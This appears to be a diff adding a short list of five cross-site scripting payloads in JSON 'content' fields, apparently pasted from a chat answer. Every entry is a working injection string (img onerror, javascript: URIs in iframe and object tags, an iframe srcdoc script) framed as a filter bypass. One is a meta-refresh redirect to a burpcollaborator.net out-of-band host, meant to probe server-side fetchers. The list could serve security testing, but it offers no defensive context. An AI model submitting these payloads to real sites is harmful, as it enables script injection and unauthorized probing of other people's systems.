@@ -1,0 +1,27 @@
+1. IMG with malformed src & onerror
+json
+Copy
+Edit
+"content": "<img src=1 onerror=alert(document.domain)>"
+2. Using onload with iframe (bypasses <svg>)
+json
+Copy
+Edit
+"content": "<iframe src=javascript:alert('xss')>"
+3. <meta http-equiv> injection (if Open Graph or metadata parsed by SSRF fetcher)
+json
+Copy
+Edit
+"content": "<meta http-equiv='refresh' content='0;url=https://x.burpcollaborator.net'>"
+4. <object> tag fallback
+json
+Copy
+Edit
+"content": "<object data='javascript:alert(1)'></object>"
+5. WASM DOM Sync Bypass Probe (uncommon)
+If WASM app reflects any HTML inside WebAssembly-managed DOM:
+
+json
+Copy
+Edit
+"content": "<iframe srcdoc='<script>alert(`WASM DOM`)</script>'></iframe>"
